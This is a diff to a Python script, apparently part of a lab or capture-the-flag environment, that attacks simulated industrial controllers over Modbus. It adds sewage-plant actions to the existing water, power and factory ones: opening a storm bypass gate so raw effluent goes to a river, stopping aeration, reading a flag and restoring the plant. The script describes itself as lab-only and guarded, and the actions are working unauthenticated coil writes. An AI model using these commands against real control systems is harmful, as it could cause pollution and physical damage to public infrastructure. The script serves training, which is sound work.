@@ -17,6 +17,11 @@
     modbus_attack.py factory flag
     modbus_attack.py factory restore
 
+    modbus_attack.py sewage bypass        # open the storm bypass -> raw effluent to the river
+    modbus_attack.py sewage aeration-off  # stop the aeration basin
+    modbus_attack.py sewage flag
+    modbus_attack.py sewage restore
+
 No auth, no validation - that is the lesson. Everything routes through the
 lab-only guard first.
 """
@@ -29,11 +34,12 @@ sys.path.insert(0, "/opt/pktr/scripts")
 from targets import guard  # noqa: E402
 
 HOST = "field-plc"
-WATER_PORT, POWER_PORT, FACTORY_PORT = 502, 503, 504
+WATER_PORT, POWER_PORT, FACTORY_PORT, SEWAGE_PORT = 502, 503, 504, 505
 
 W = dict(INTAKE=0, HIGHLIFT=1, CHLORINE=2, MAIN_VALVE=3, MAINT=8, HIGHLIFT_SP=0, CHLORINE_SP=1)
 P = dict(MAIN=0, RES=1, BIZ=2, IND=3, ST=4, GEN=5, MAINT=8, GEN_SP=0)
 F = dict(LINE_RUN=0, ESTOP_BYPASS=1, GANTRY=2, HOPPER_GATE=3, MAINT=8, LINE_SPEED=0)
+SG = dict(AERATION=0, CHEM_DOSE=1, RETURN_PUMP=2, BYPASS_GATE=3, MAINT=8, DOSE_SP=0)
 FEEDER = {"residential": P["RES"], "business": P["BIZ"], "industrial": P["IND"], "streetlights": P["ST"]}
 FLAG_BASE, FLAG_LEN = 100, 32
 
@@ -109,6 +115,21 @@ def main():
             c.write_coil(F["MAINT"], False, slave=1); print("[+] factory restored")
         else:
             sys.exit(f"unknown factory action: {action}")
+    elif plant == "sewage":
+        c = client(SEWAGE_PORT)
+        if action == "bypass":
+            c.write_coil(SG["BYPASS_GATE"], True, slave=1)
+            c.write_coil(SG["AERATION"], False, slave=1); print("[+] storm bypass opened, aeration off -> raw effluent")
+        elif action == "aeration-off":
+            c.write_coil(SG["AERATION"], False, slave=1); print("[+] aeration basin stopped")
+        elif action == "flag":
+            print(read_flag(c))
+        elif action == "restore":
+            c.write_coils(0, [True, True, True, False], slave=1)
+            c.write_register(SG["DOSE_SP"], 140, slave=1)
+            c.write_coil(SG["MAINT"], False, slave=1); print("[+] sewage restored")
+        else:
+            sys.exit(f"unknown sewage action: {action}")
     else:
         sys.exit(f"unknown plant: {plant}")
 
